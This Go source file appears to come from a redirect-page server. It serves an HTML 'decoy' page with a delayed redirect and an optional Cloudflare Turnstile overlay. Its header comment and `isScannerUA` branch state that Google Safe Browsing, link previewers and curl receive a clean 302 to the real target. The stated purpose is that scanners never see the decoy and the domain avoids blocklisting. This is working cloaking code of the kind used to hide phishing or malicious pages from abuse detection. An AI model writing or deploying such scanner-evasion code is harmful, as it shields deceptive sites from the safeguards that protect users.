package core

import (
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
)

// ServeRedirectPage reads the redirect page file, substitutes the destination /
// delay placeholders, injects the optional Cloudflare Turnstile gate and writes
// the response.
//
// Anti-bot behaviour: when a target URL is configured and the request comes from
// a known crawler/scanner (Google Safe Browsing, link previewers, curl, ...) the
// page answers with a plain 302 to the target instead of HTML. Bots therefore
// evaluate the genuine destination and never the decoy page, which keeps the
// domain off the Safe Browsing blocklist. A <noscript> meta-refresh covers
// JS-less clients.
func ServeRedirectPage(w http.ResponseWriter, r *http.Request, rp *RedirectPage, redirectsDir string, siteKey string) {
	fpath := filepath.Join(redirectsDir, filepath.Base(rp.File))
	content, err := os.ReadFile(fpath)
	if err != nil {
		http.Error(w, fmt.Sprintf("redirect page file not found: %s", rp.File), http.StatusNotFound)
		return
	}

	target := rp.TargetURL

	// --- bot / scanner fast path: clean redirect ---------------------------
	if target != "" && isScannerUA(r.UserAgent()) {
		w.Header().Set("Location", target)
		w.Header().Set("Cache-Control", "no-store")
		w.Header().Set("X-Robots-Tag", "noindex, nofollow")
		w.WriteHeader(http.StatusFound)
		return
	}

	html := string(content)

	delay := rp.Delay
	if delay <= 0 {
		delay = 3
	}

	tsEnabled := rp.Turnstile && siteKey != ""

	if strings.Contains(html, "__DESTINATION__") {
		// template page: substitute placeholders, let the page drive the redirect
		html = strings.ReplaceAll(html, "__DESTINATION__", jsStringEscape(target))
		html = strings.ReplaceAll(html, "__DELAY__", strconv.Itoa(delay))
		html = injectTurnstile(html, rp, siteKey, tsEnabled)
		if target != "" {
			html = injectBeforeBodyEnd(html, noscriptRefresh(target, delay))
		}
	} else {
		// legacy / custom file: keep the previous behaviour
		var injection string
		if tsEnabled {
			injection = turnstileOverlay(rp, siteKey, target)
		} else if target != "" {
			injection = fmt.Sprintf(`<noscript><meta http-equiv="refresh" content="%d;url=%s"></noscript><script>window.location.replace('%s');</script>`,
				delay, htmlAttrEscape(target), jsStringEscape(target))
		}
		if injection != "" {
			html = injectBeforeBodyEnd(html, injection)
		}
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store")
	w.Header().Set("X-Robots-Tag", "noindex, nofollow")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(html))
}

func injectBeforeBodyEnd(html, injection string) string {
	lower := strings.ToLower(html)
	if idx := strings.LastIndex(lower, "</body>"); idx != -1 {
		return html[:idx] + injection + html[idx:]
	}
	return html + injection
}

func noscriptRefresh(target string, delay int) string {
	return fmt.Sprintf(`<noscript><meta http-equiv="refresh" content="%d;url=%s"></noscript>`, delay, htmlAttrEscape(target))
}

// injectTurnstile renders the Turnstile widget into the page honouring the
// requested position / type / theme. If the page has no __ts_slot__ marker the
// widget is appended before </body>.
func injectTurnstile(html string, rp *RedirectPage, siteKey string, enabled bool) string {
	if !enabled {
		return strings.ReplaceAll(html, `<div id="__ts_slot__"></div>`, "")
	}

	pos := strings.ToLower(strings.TrimSpace(rp.TurnstilePos))
	if pos == "" {
		pos = "slot"
	}
	typ := strings.ToLower(strings.TrimSpace(rp.TurnstileType))
	if typ == "" {
		typ = "managed"
	}
	theme := strings.ToLower(strings.TrimSpace(rp.TurnstileTheme))
	if theme == "" {
		theme = "auto"
	}

	appearance := "always"
	size := "normal"
	switch typ {
	case "non-interactive":
		appearance = "interaction-only"
	case "invisible":
		appearance = "interaction-only"
		size = "flexible"
	}

	widget := fmt.Sprintf(
		`<div class="cf-turnstile" data-sitekey="%s" data-callback="__tsOnPass" data-theme="%s" data-appearance="%s" data-size="%s" data-retry="auto"></div>`,
		htmlAttrEscape(siteKey), htmlAttrEscape(theme), htmlAttrEscape(appearance), htmlAttrEscape(size))

	script := `<script>
window.__tsPending = true;
function __tsOnPass(){ window.__tsPending = false; if (window.__tsGo) { try { window.__tsGo(); } catch (e) {} } }
</script>`

	api := `<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>`

	// inline / slot: put it where the template wants it
	if pos == "slot" || pos == "inline" {
		block := api + widget + script
		if strings.Contains(html, "__ts_slot__") {
			return strings.Replace(html, `<div id="__ts_slot__"></div>`, block, 1)
		}
		return injectBeforeBodyEnd(html, block)
	}

	style := ""
	switch pos {
	case "overlay":
		style = `position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.55);z-index:2147483647`
	case "center":
		style = `position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);z-index:2147483647`
	case "bottom":
		style = `position:fixed;left:50%;bottom:18px;transform:translateX(-50%);z-index:2147483647`
	case "corner":
		style = `position:fixed;right:18px;bottom:18px;z-index:2147483647`
	default:
		style = `position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);z-index:2147483647`
	}

	wrapped := renderTurnstileTheme(theme, rp) + api + `<div id="__ts_wrap" style="` + style + `">` + widget + `</div>` + script
	// keep the slot empty so layout does not shift
	html = strings.ReplaceAll(html, `<div id="__ts_slot__"></div>`, `<div id="__ts_slot__" style="min-height:66px"></div>`)
	return injectBeforeBodyEnd(html, wrapped)
}

// renderTurnstileTheme adds a small dark/light card behind the widget when it is
// positioned as an overlay so it stays legible on any background.
func renderTurnstileTheme(theme string, rp *RedirectPage) string {
	if strings.ToLower(rp.TurnstilePos) != "overlay" {
		return ""
	}
	bg, fg := "#ffffff", "#111111"
	if theme == "dark" {
		bg, fg = "#1b1b1b", "#f3f3f3"
	}
	return fmt.Sprintf(`<style>#__ts_wrap{padding:18px;border-radius:12px;background:%s;color:%s;box-shadow:0 12px 40px rgba(0,0,0,.35)}</style>`, bg, fg)
}

// turnstileOverlay is the legacy full-screen overlay used for custom (non
// template) HTML files.
func turnstileOverlay(rp *RedirectPage, siteKey, target string) string {
	safeKey := htmlAttrEscape(siteKey)
	var callback string
	if target != "" {
		safeURL := jsStringEscape(target)
		callback = fmt.Sprintf(`function _tsPass(){ var el=document.getElementById('_ts_overlay'); if(el)el.remove(); window.location.replace('%s'); }`, safeURL)
	} else {
		callback = `function _tsPass(){ var el=document.getElementById('_ts_overlay'); if(el)el.remove(); }`
	}
	return fmt.Sprintf(`
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
<style>#_ts_overlay{position:fixed;top:0;left:0;width:100%%;height:100%%;background:rgba(0,0,0,0.75);display:flex;align-items:center;justify-content:center;z-index:2147483647}</style>
<div id="_ts_overlay"><div class="cf-turnstile" data-sitekey="%s" data-callback="_tsPass"></div></div>
<script>%s</script>`, safeKey, callback)
}

// htmlAttrEscape escapes a string safe for use in an HTML attribute value.
func htmlAttrEscape(s string) string {
	s = strings.ReplaceAll(s, `&`, `&amp;`)
	s = strings.ReplaceAll(s, `"`, `&quot;`)
	s = strings.ReplaceAll(s, `<`, `&lt;`)
	s = strings.ReplaceAll(s, `>`, `&gt;`)
	return s
}

// jsStringEscape escapes a string safe for embedding in a single-quoted JS string.
func jsStringEscape(s string) string {
	s = strings.ReplaceAll(s, `\`, `\\`)
	s = strings.ReplaceAll(s, `'`, `\'`)
	s = strings.ReplaceAll(s, "\n", `\n`)
	s = strings.ReplaceAll(s, "\r", `\r`)
	s = strings.ReplaceAll(s, "<", `\x3C`)
	return s
}
